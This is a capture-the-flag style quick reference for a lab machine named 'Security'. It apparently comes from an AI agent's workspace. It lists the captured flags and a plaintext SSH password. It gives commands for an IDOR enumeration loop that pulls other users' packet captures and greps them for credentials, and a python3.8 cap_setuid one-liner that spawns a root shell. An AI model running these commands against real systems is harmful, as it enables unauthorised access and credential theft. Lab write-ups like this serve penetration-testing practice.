# Security (10.129.32.156) - Quick Reference

## Flags
- **User**: `4926d56b6aa57345c6acedb703b85521`
- **Root**: `3fbfeb016106a14105150774e3b43a66`

## Credentials
- `nathan:Buck3tH4TF0RM3!` (SSH/FTP)

## Vulnerabilities
1. **IDOR** - `/download/<id>` allows access to other users' PCAPs
2. **Linux Capabilities** - `python3.8` has `cap_setuid` for privesc

## Exploitation Commands

### IDOR - Download PCAP
```bash
curl http://TARGET/download/0 -o capture.pcap
strings capture.pcap | grep -iE "USER|PASS"
```

### SSH Access
```bash
ssh nathan@TARGET
# Password: Buck3tH4TF0RM3!
```

### Privesc via cap_setuid
```bash
# Check capabilities
getcap -r / 2>/dev/null

# Exploit python3.8 with cap_setuid
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Key Learnings
- IDOR can expose historical sensitive data
- PCAP files may contain cleartext credentials
- `cap_setuid` on interpreters = instant root
- Always check `getcap` after initial access

## Report Location
`/home/raquel/.openclaw/workspace/reports/10.129.32.156/security-report.md`

## Methodology Improvements (Lessons for Future Boxes)

### What I Should Have Done Faster:
1. **Check /download endpoints immediately** when seeing /data/<id> patterns
2. **Analyze ALL PCAP files** from IDOR, not just the first one with content
3. **Start with /data/0 or /download/0** - historical data often has credentials
4. **Don't brute force passwords blindly** - look for credential leaks first

### Red Flags I Missed:
- `/data/<sequential_id>` pattern = likely IDOR to historical data
- "Packet Capture" in app name = check /download immediately
- FTP traffic in PCAP = credentials likely in cleartext

### Better Approach Next Time:
```bash
# When seeing /data/<id> or /capture endpoints:
1. Trigger capture: curl http://TARGET/capture
2. Check IDOR range: for i in {0..20}; do curl -s http://TARGET/download/$i -o /tmp/dl_$i; done
3. Find non-empty files: for f in /tmp/dl_*; do [ $(wc -c < $f) -gt 100 ] && echo "$f"; done
4. Extract credentials: strings /tmp/dl_*.bin | grep -iE "USER|PASS|password"
5. Test credentials on SSH immediately
```

### Capability Privesc Checklist:
```bash
# After ANY initial access:
getcap -r / 2>/dev/null | grep -v "^$"
# If python/perl/ruby/node has cap_setuid:
# <binary> -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
